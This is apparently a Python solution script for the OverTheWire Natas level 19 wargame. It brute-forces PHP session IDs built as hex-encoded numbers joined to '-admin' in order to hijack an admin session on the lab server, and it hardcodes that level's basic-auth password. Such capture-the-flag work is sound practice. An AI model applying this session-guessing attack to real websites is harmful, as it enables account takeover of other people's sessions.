from requests import request as req


def request(sid: str):
    res = req(
        url="http://natas19.natas.labs.overthewire.org",
        method="GET",
        auth=("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"),
        cookies={"PHPSESSID": sid},
    )

    return res


def make_sid(i: int):
    """
    session id 구조에 맞게 변경
    """
    prefix = "".join([f"{ord(c):x}" for c in str(i)])

    # 2d: '-'
    # 61646d696e: 'admin'
    return f"{prefix}2d61646d696e"


for i in range(1, 641):
    sid = make_sid(i)
    print(sid)
    res = request(sid)
    if "You are logged in as a regular user." not in res.text:
        print(res.text)
        break
